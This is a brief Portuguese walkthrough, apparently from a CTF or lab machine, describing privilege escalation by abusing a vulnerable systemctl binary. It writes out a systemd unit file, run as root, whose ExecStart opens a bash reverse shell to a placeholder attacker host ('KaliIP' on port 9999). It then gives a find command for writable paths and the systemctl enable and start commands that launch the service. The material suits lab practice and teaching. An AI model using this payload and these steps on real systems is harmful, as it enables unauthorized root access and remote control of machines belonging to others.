O processo de entrar na máquina é bem detalhado

encontramos o serviço systemctl vulneravel

Cria o ``root.service``
```
[Unit]
Description=rooot

[Service]
Type=simple
User=root
ExecStart=/bin/bash -c 'bash -i >& /dev/tcp/KaliIP/9999 0>&1'

[Install]
WantedBy=multi-user.target
```

e da upload na máquina onde quer q vc consiga escrever.
esse comando acha os diretórios que podem ser escritos
``find / -type f -maxdepth 2 -writable``

depois usa:
``/bin/systemctl enable /dev/shm/root.service``

``/bin/systemctl start root`` e pronto


